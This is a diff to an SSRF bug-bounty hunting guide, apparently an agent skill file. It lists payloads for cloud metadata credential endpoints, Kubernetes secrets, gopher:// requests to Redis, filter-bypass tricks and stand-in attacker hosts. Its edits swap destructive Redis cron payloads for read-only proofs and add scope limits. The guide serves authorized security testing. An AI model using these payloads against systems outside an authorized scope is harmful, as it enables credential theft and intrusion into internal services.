@@ -149,7 +149,7 @@ X-Cache headers revealing internal hostnames
    http://127.0.0.1:9200/  (Elasticsearch)
    ```
 
-6. **Check for redirect-based SSRF** — if the endpoint validates the initial URL but follows 30x redirects, host a redirect server pointing to internal addresses. Kubernetes report (Report 3) was specifically triggered by hijacked API servers returning 30x responses.
+6. **Check for redirect-based SSRF** — if the endpoint validates the initial URL but follows 30x redirects, host a redirect server pointing to internal addresses. Aggregated API proxies (Kubernetes-style) that follow 30x from a registered extension server are the same class (Scenario B).
 
 7. **Test JavaScript-execution contexts** (headless browsers, PDF renderers):
    - Inject `<script>` tags that make `XMLHttpRequest` or `fetch()` calls to internal services
@@ -191,6 +191,9 @@ http://169.254.169.254/computeMetadata/v1/project/project-id
 
 # AWS IMDSv1 (no auth required)
 http://169.254.169.254/latest/meta-data/iam/security-credentials/
+# List returns role names. Proof is one follow-up GET of
+# http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
+# that returns AccessKeyId. Stop. Do not use the keys off-scope.
 http://169.254.169.254/latest/user-data
 
 # Azure — requires header Metadata: true (400 without it still proves link-local reach)
@@ -200,8 +203,11 @@ http://169.254.169.254/metadata/instance?api-version=2021-02-01
 #   header X-aws-ec2-metadata-token-ttl-seconds: 60, then GET metadata with
 #   X-aws-ec2-metadata-token: <token>. Hop-limit 1 blocks an extra proxy; a client
 #   ON the instance (headless browser, sidecar-less fetcher) still gets the token.
-# ECS:  http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
-# EKS pod identity (when the env advertises it): http://169.254.170.23/v1/credentials
+# ECS:  http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI (no header needed)
+# EKS pod identity (when the env advertises it): GET http://169.254.170.23/v1/credentials
+#   REQUIRES header Authorization: <token from /var/run/secrets/pods.eks.amazonaws.com/
+#   serviceaccount/eks-pod-identity-token>. Header-less SSRF cannot read it directly —
+#   same header-injection paths as IMDSv2/GCP below. A 401/400 here still proves link-local reach.
 # Alibaba: http://100.100.100.100/latest/meta-data/
 # Oracle:  http://169.254.169.254/opc/v2/instance/  (header Authorization: Bearer Oracle)
 # DigitalOcean: http://169.254.169.254/metadata/v1/
@@ -214,8 +220,8 @@ Header-less clients cannot call IMDSv2/GCP/Azure directly. In order: (1) product
 ```bash
 # Kubernetes internals
 http://127.0.0.1:6443/api/v1/namespaces
-http://10.0.0.1:6443/api/v1/secrets
-http://127.0.0.1:10250/pods          # kubelet
+http://127.0.0.1:6443/api/v1/namespaces/default/secrets/<one-name>   # one object, after namespaces already returned JSON
+http://127.0.0.1:10250/pods          # kubelet — one GET, do not list every pod's env
 http://127.0.0.1:2379/v2/keys        # etcd
 
 # Common internal services
@@ -223,6 +229,9 @@ http://127.0.0.1:6379/               # Redis (check for inline commands)
 http://127.0.0.1:9200/_cat/indices   # Elasticsearch
 http://127.0.0.1:5601/               # Kibana
 http://127.0.0.1:8500/v1/catalog/services  # Consul
+http://127.0.0.1:2375/version        # Docker API — JSON ApiVersion is the proof. Stop. Do not create containers.
+# HTTP-over-gopher (when http:// to that port is blocked but gopher:// is not). One GET:
+# gopher://127.0.0.1:8080/_GET%20/actuator/env%20HTTP/1.0%0d%0a%0d%0a
 ```
 
 ### Redirect-Based SSRF (when direct is blocked)
@@ -313,9 +322,12 @@ http://0x7f000001/          (127.0.0.1 hex)
 http://0177.0.0.1/          (octal)
 http://127.1/               (short form)
 http://0/                   (resolves to 0.0.0.0)
+http://127.0.0.1./          (trailing dot — different string, same address)
+http://169.254.169.254./
 
 # DNS rebinding - register a domain that resolves to internal IP after first check
-# Use https://lock.cmpxchg8b.com/rebinder.html
+# Working rebinding services: 1u.ms (e.g. make-1u.ms alternates two IPs),
+# rebind.network, or self-hosted rbndr. The old lock.cmpxchg8b.com rebinder is offline.
 
 # Subdomain pointing to internal IP
 http://localtest.me/         (resolves to 127.0.0.1)
@@ -331,7 +343,7 @@ http://evil.com\.127.0.0.1/   (backslash)
 # Protocol confusion
 file:///etc/passwd
 dict://127.0.0.1:6379/
-gopher://127.0.0.1:6379/_FLUSHALL  (Redis via gopher)
+gopher://127.0.0.1:6379/_INFO%0d%0a   (Redis: INFO or PING only — never FLUSHALL, SLAVEOF, CONFIG SET, cron, or authorized_keys)
 sftp://attacker.com:11111/
 ldap://127.0.0.1/
 
@@ -419,7 +431,7 @@ The following real, verified bug-bounty / coordinated-disclosure cases extend th
 
 6. **Yahoo Mail — Blind SSRF → Gopher → Redis RCE** ([Writeup](https://sirleeroyjenkins.medium.com/just-gopher-it-escalating-a-blind-ssrf-to-rce-for-15k-f5329a974530))
     - Subclass: gopher protocol abuse → Redis SSRF → SSRF-to-RCE chain
-    - Payload: blind SSRF in Yahoo Mail backend reached via `gopher://internal-redis:6379/_*1%0d%0a$8%0d%0aflushall...SET stuff /var/spool/cron/root...BGSAVE` — wrote a cron via Redis to get command execution
+    - Payload (historical, do not replay): blind SSRF reached internal Redis over `gopher://` and the writeup used `FLUSHALL` plus a cron write. Your proof is `INFO`/`PING` or one unique `SET`. Do not flush data or write cron/SSH keys.
     - Root cause: gopher scheme not blocklisted; internal Redis unauthenticated on default port; SSRF target accepted 302 redirect from attacker host to `gopher://`
     - Year: 2020 — **$15,000**
 
@@ -441,7 +453,7 @@ The following real, verified bug-bounty / coordinated-disclosure cases extend th
 
 - **`cloud-iam-deep`** — SSRF is the canonical entry to cloud metadata service. Chain primitive: SSRF → IMDSv1 token theft → `cloud-iam-deep` privilege escalation reaches `iam:CreateUser` / `sts:AssumeRole` on cross-account roles.
 - **`hunt-llm-ai`** — LLMs with fetch_url tools become SSRF proxies bypassing network egress controls. Chain primitive: LLM tool-use (fetch_url) + SSRF → attacker URL exfils chat history and IMDS token from the LLM container.
-- **`hunt-rce`** — Internal Redis/Memcached are unauthenticated by default and reachable via gopher://. Chain primitive: SSRF + Gopher → internal Redis `CONFIG SET dir` + RCE via cron / SSH authorized_keys write.
+- **`hunt-rce`** — Unauthenticated Redis/Memcached is reachable via `gopher://`. Prove it with `INFO` or `PING` (reflected) or one `SET` of a unique key you can read back. Stop there. Do not `FLUSHALL`, `SLAVEOF`, `CONFIG SET`, write a crontab, or write `authorized_keys`.
 - **`hunt-cloud-misconfig`** — Internal-only buckets/APIs become reachable through SSRF egress. Chain primitive: SSRF + DNS rebinding → SSRF-protected-endpoint bypass → internal /admin or private S3 bucket read.
 - **`security-arsenal`** — Load the SSRF IP Bypass Table (11 techniques: decimal IP, IPv6 mapped, octal, suffix dot, DNS rebinding, redirect chain, etc.) before testing filters.
 - **`triage-validation`** — Apply the OOB-Or-It-Didn't-Happen gate: every blind SSRF claim requires a Burp Collaborator hit with a unique marker before report submission.
